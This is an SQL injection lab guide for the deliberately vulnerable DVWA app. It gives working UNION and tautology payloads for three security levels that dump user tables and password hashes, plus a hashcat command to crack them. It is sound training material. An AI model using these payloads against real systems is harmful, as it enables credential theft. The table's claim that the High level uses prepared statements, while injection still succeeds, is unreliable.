# SQL Injection Lab — DVWA

## Setup

```bash
# Start the lab
docker compose up -d

# Wait ~30 seconds for DB to initialize, then open:
# http://localhost → admin / password → "Create / Reset Database"

# Stop the lab
docker compose down

# Stop and delete all data
docker compose down -v
```

## Exercises

### Security Level: LOW

Navigate to **DVWA → SQL Injection** and set Security Level to **Low**.

#### 1. Authentication Bypass / Dump All Users
```
1' OR '1'='1
```
Returns all users — the WHERE clause becomes always true.

#### 2. UNION-based injection — Extract password hashes
```
1' UNION SELECT user,password FROM users--
```
Dumps usernames and MD5 hashes from the `users` table.

#### 3. Extract DB metadata
```
1' UNION SELECT table_name,table_schema FROM information_schema.tables--
```

#### 4. Extract column names
```
1' UNION SELECT column_name,table_name FROM information_schema.columns WHERE table_name='users'--
```

---

### Security Level: MEDIUM

DVWA switches the input to a dropdown (prevents direct string injection).
The backend uses `mysql_real_escape_string()` on the value.

**Bypass**: Use a numeric payload — no quotes needed:
```
1 OR 1=1
1 UNION SELECT user,password FROM users#
```

---

### Security Level: HIGH

Input is moved to a separate page/session. The query uses `LIMIT 1`.

**Bypass**: The `LIMIT` clause can be commented out:
```
1' UNION SELECT user,password FROM users LIMIT 1,1#
```
Iterate the offset to enumerate all rows.

---

## Analysis — How Defenses Change Behavior

| Level  | Input method | Escaping            | Other controls          |
|--------|-------------|---------------------|-------------------------|
| Low    | Text field  | None                | None                    |
| Medium | Dropdown    | `mysql_real_escape_string` | Blocks string quotes |
| High   | Session     | PDO (prepared stmt) | `LIMIT 1`, token check  |

## Crack the Hashes (offline)

```bash
# MD5 — example hash from DVWA default user
echo "5f4dcc3b5aa765d61d8327deb882cf99" | hashcat -m 0 -a 0 - /usr/share/wordlists/rockyou.txt
# Result: password
```

## Cleanup

```bash
docker compose down -v   # removes containers + DB volume
```
